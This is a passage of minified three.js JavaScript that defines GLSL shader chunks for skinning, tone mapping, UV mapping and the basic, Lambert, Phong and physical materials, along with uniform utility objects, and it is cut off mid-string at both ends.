/ float( boneTextureHeight );\\n\\t\\t\\ty = dy * ( y + 0.5 );\\n\\t\\t\\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\\n\\t\\t\\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\\n\\t\\t\\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\\n\\t\\t\\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\\n\\t\\t\\tmat4 bone = mat4( v1, v2, v3, v4 );\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#else\\n\\t\\tuniform mat4 boneMatrices[ MAX_BONES ];\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tmat4 bone = boneMatrices[ int(i) ];\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.skinning_vertex=\"#ifdef USE_SKINNING\\n\\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\\n\\tvec4 skinned = vec4( 0.0 );\\n\\tskinned += boneMatX * skinVertex * skinWeight.x;\\n\\tskinned += boneMatY * skinVertex * skinWeight.y;\\n\\tskinned += boneMatZ * skinVertex * skinWeight.z;\\n\\tskinned += boneMatW * skinVertex * skinWeight.w;\\n\\tskinned  = bindMatrixInverse * skinned;\\n#endif\\n\";THREE.ShaderChunk.skinnormal_vertex=\"#ifdef USE_SKINNING\\n\\tmat4 skinMatrix = mat4( 0.0 );\\n\\tskinMatrix += skinWeight.x * boneMatX;\\n\\tskinMatrix += skinWeight.y * boneMatY;\\n\\tskinMatrix += skinWeight.z * boneMatZ;\\n\\tskinMatrix += skinWeight.w * boneMatW;\\n\\tskinMatrix  = bindMatrixInverse * skinMatrix * bindMatrix;\\n\\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\\n#endif\\n\";\nTHREE.ShaderChunk.specularmap_fragment=\"float specularStrength;\\n#ifdef USE_SPECULARMAP\\n\\tvec4 texelSpecular = texture2D( specularMap, vUv );\\n\\tspecularStrength = texelSpecular.r;\\n#else\\n\\tspecularStrength = 1.0;\\n#endif\";THREE.ShaderChunk.specularmap_pars_fragment=\"#ifdef USE_SPECULARMAP\\n\\tuniform sampler2D specularMap;\\n#endif\";THREE.ShaderChunk.tonemapping_fragment=\"#if defined( TONE_MAPPING )\\n  gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\\n#endif\\n\";\nTHREE.ShaderChunk.tonemapping_pars_fragment=\"#define saturate(a) clamp( a, 0.0, 1.0 )\\nuniform float toneMappingExposure;\\nuniform float toneMappingWhitePoint;\\nvec3 LinearToneMapping( vec3 color ) {\\n  return toneMappingExposure * color;\\n}\\nvec3 ReinhardToneMapping( vec3 color ) {\\n  color *= toneMappingExposure;\\n  return saturate( color / ( vec3( 1.0 ) + color ) );\\n}\\n#define Uncharted2Helper( x ) max( ( ( x * ( 0.15 * x + 0.10 * 0.50 ) + 0.20 * 0.02 ) / ( x * ( 0.15 * x + 0.50 ) + 0.20 * 0.30 ) ) - 0.02 / 0.30, vec3( 0.0 ) )\\nvec3 Uncharted2ToneMapping( vec3 color ) {\\n  color *= toneMappingExposure;\\n  return saturate( Uncharted2Helper( color ) / Uncharted2Helper( vec3( toneMappingWhitePoint ) ) );\\n}\\nvec3 OptimizedCineonToneMapping( vec3 color ) {\\n  color *= toneMappingExposure;\\n  color = max( vec3( 0.0 ), color - 0.004 );\\n  return pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\\n}\\n\";\nTHREE.ShaderChunk.uv2_pars_fragment=\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvarying vec2 vUv2;\\n#endif\";THREE.ShaderChunk.uv2_pars_vertex=\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tattribute vec2 uv2;\\n\\tvarying vec2 vUv2;\\n#endif\";THREE.ShaderChunk.uv2_vertex=\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvUv2 = uv2;\\n#endif\";THREE.ShaderChunk.uv_pars_fragment=\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n#endif\";\nTHREE.ShaderChunk.uv_pars_vertex=\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n\\tuniform vec4 offsetRepeat;\\n#endif\\n\";THREE.ShaderChunk.uv_vertex=\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvUv = uv * offsetRepeat.zw + offsetRepeat.xy;\\n#endif\";\nTHREE.ShaderChunk.worldpos_vertex=\"#if defined( USE_ENVMAP ) || defined( PHONG ) || defined( PHYSICAL ) || defined( LAMBERT ) || defined ( USE_SHADOWMAP )\\n\\t#ifdef USE_SKINNING\\n\\t\\tvec4 worldPosition = modelMatrix * skinned;\\n\\t#else\\n\\t\\tvec4 worldPosition = modelMatrix * vec4( transformed, 1.0 );\\n\\t#endif\\n#endif\\n\";\nTHREE.UniformsUtils={merge:function(a){for(var b={},c=0;c<a.length;c++){var d=this.clone(a[c]),e;for(e in d)b[e]=d[e]}return b},clone:function(a){var b={},c;for(c in a){b[c]={};for(var d in a[c]){var e=a[c][d];e instanceof THREE.Color||e instanceof THREE.Vector2||e instanceof THREE.Vector3||e instanceof THREE.Vector4||e instanceof THREE.Matrix3||e instanceof THREE.Matrix4||e instanceof THREE.Texture?b[c][d]=e.clone():Array.isArray(e)?b[c][d]=e.slice():b[c][d]=e}}return b}};\nTHREE.UniformsLib={common:{diffuse:{value:new THREE.Color(15658734)},opacity:{value:1},map:{value:null},offsetRepeat:{value:new THREE.Vector4(0,0,1,1)},specularMap:{value:null},alphaMap:{value:null},envMap:{value:null},flipEnvMap:{value:-1},reflectivity:{value:1},refractionRatio:{value:.98}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1}},emissivemap:{emissiveMap:{value:null}},bumpmap:{bumpMap:{value:null},bumpScale:{value:1}},normalmap:{normalMap:{value:null},\nnormalScale:{value:new THREE.Vector2(1,1)}},displacementmap:{displacementMap:{value:null},displacementScale:{value:1},displacementBias:{value:0}},roughnessmap:{roughnessMap:{value:null}},metalnessmap:{metalnessMap:{value:null}},fog:{fogDensity:{value:2.5E-4},fogNear:{value:1},fogFar:{value:2E3},fogColor:{value:new THREE.Color(16777215)}},lights:{ambientLightColor:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},\ndirectionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},spotShadowMap:{value:[]},spotShadowMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},\nskyColor:{},groundColor:{}}}},points:{diffuse:{value:new THREE.Color(15658734)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},offsetRepeat:{value:new THREE.Vector4(0,0,1,1)}}};THREE.ShaderChunk.cube_frag=\"uniform samplerCube tCube;\\nuniform float tFlip;\\nvarying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = textureCube( tCube, vec3( tFlip * vWorldPosition.x, vWorldPosition.yz ) );\\n\\t#include <logdepthbuf_fragment>\\n}\\n\";\nTHREE.ShaderChunk.cube_vert=\"varying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\";THREE.ShaderChunk.depth_frag=\"#if DEPTH_PACKING == 3200\\n\\tuniform float opacity;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <uv_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( 1.0 );\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tdiffuseColor.a = opacity;\\n\\t#endif\\n\\t#include <map_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <logdepthbuf_fragment>\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tgl_FragColor = vec4( vec3( gl_FragCoord.z ), opacity );\\n\\t#elif DEPTH_PACKING == 3201\\n\\t\\tgl_FragColor = packDepthToRGBA( gl_FragCoord.z );\\n\\t#endif\\n}\\n\";\nTHREE.ShaderChunk.depth_vert=\"#include <common>\\n#include <uv_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\";\nTHREE.ShaderChunk.distanceRGBA_frag=\"uniform vec3 lightPos;\\nvarying vec4 vWorldPosition;\\n#include <common>\\n#include <packing>\\n#include <clipping_planes_pars_fragment>\\nvoid main () {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = packDepthToRGBA( length( vWorldPosition.xyz - lightPos.xyz ) / 1000.0 );\\n}\\n\";THREE.ShaderChunk.distanceRGBA_vert=\"varying vec4 vWorldPosition;\\n#include <common>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <skinbase_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvWorldPosition = worldPosition;\\n}\\n\";\nTHREE.ShaderChunk.equirect_frag=\"uniform sampler2D tEquirect;\\nuniform float tFlip;\\nvarying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec3 direction = normalize( vWorldPosition );\\n\\tvec2 sampleUV;\\n\\tsampleUV.y = saturate( tFlip * direction.y * -0.5 + 0.5 );\\n\\tsampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;\\n\\tgl_FragColor = texture2D( tEquirect, sampleUV );\\n\\t#include <logdepthbuf_fragment>\\n}\\n\";\nTHREE.ShaderChunk.equirect_vert=\"varying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\";THREE.ShaderChunk.linedashed_frag=\"uniform vec3 diffuse;\\nuniform float opacity;\\nuniform float dashSize;\\nuniform float totalSize;\\nvarying float vLineDistance;\\n#include <common>\\n#include <color_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\\n\\t\\tdiscard;\\n\\t}\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <color_fragment>\\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\";\nTHREE.ShaderChunk.linedashed_vert=\"uniform float scale;\\nattribute float lineDistance;\\nvarying float vLineDistance;\\n#include <common>\\n#include <color_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <color_vertex>\\n\\tvLineDistance = scale * lineDistance;\\n\\tvec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\\n\\tgl_Position = projectionMatrix * mvPosition;\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\";\nTHREE.ShaderChunk.meshbasic_frag=\"uniform vec3 diffuse;\\nuniform float opacity;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\tReflectedLight reflectedLight;\\n\\treflectedLight.directDiffuse = vec3( 0.0 );\\n\\treflectedLight.directSpecular = vec3( 0.0 );\\n\\treflectedLight.indirectDiffuse = diffuseColor.rgb;\\n\\treflectedLight.indirectSpecular = vec3( 0.0 );\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.indirectDiffuse;\\n\\t#include <normal_flip>\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\";\nTHREE.ShaderChunk.meshbasic_vert=\"#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#ifdef USE_ENVMAP\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n\\t#endif\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <envmap_vertex>\\n}\\n\";\nTHREE.ShaderChunk.meshlambert_frag=\"uniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float opacity;\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <fog_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <shadowmask_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <emissivemap_fragment>\\n\\treflectedLight.indirectDiffuse = getAmbientLightIrradiance( ambientLightColor );\\n\\t#include <lightmap_fragment>\\n\\treflectedLight.indirectDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb );\\n\\t#ifdef DOUBLE_SIDED\\n\\t\\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\\n\\t#else\\n\\t\\treflectedLight.directDiffuse = vLightFront;\\n\\t#endif\\n\\treflectedLight.directDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb ) * getShadowMask();\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\\n\\t#include <normal_flip>\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\";\nTHREE.ShaderChunk.meshlambert_vert=\"#define LAMBERT\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <lights_lambert_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\";\nTHREE.ShaderChunk.meshphong_frag=\"#define PHONG\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform vec3 specular;\\nuniform float shininess;\\nuniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <lights_phong_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\t#include <emissivemap_fragment>\\n\\t#include <lights_phong_fragment>\\n\\t#include <lights_template>\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\";\nTHREE.ShaderChunk.meshphong_vert=\"#define PHONG\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include <worldpos_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\";\nTHREE.ShaderChunk.meshphysical_frag=\"#define PHYSICAL\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float roughness;\\nuniform float metalness;\\nuniform float opacity;\\n#ifndef STANDARD\\n\\tuniform float clearCoat;\\n\\tuniform float clearCoatRoughness;\\n#endif\\nuniform float envMapIntensity;\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <bsdfs>\\n#include <cube_uv_reflection_fragment>\\n#include <lights_pars>\\n#include <lights_physical_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <roughnessmap_pars_fragment>\\n#include <metalnessmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <roughnessmap_fragment>\\n\\t#include <metalnessmap_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\t#include <emissivemap_fragment>\\n\\t#include <lights_physical_fragment>\\n\\t#include <lights_template>\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\";\nTHREE.ShaderChunk.meshphysical_vert=\"#define PHYSICAL\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\";\nTHREE.ShaderChunk.normal_frag=\"uniform float opacity;\\nvarying vec3 vNormal;\\n#include <common>\\n#include <packing>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = vec4( packNormalToRGB( vNormal ), opacity );\\n\\t#include <logdepthbuf_fragment>\\n}\\n\";THREE.ShaderChunk.normal_vert=\"varying vec3 vNormal;\\n#include <common>\\n#include <morphtarget_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\tvNormal = normalize( normalMatrix * normal );\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\";\nTHREE.ShaderChunk.points_frag=\"uniform vec3 diffuse;\\nuniform float opacity;\\n#include <common>\\n#include <color_pars_fragment>\\n#include <map_particle_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_particle_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphatest_fragment>\\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\";\nTHREE.ShaderChunk.points_vert=\"uniform float size;\\nuniform float scale;\\n#include <common>\\n#include <color_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <color_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#ifdef USE_SIZEATTENUATION\\n\\t\\tgl_PointSize = size * ( scale / - mvPosition.z );\\n\\t#else\\n\\t\\tgl_PointSize = 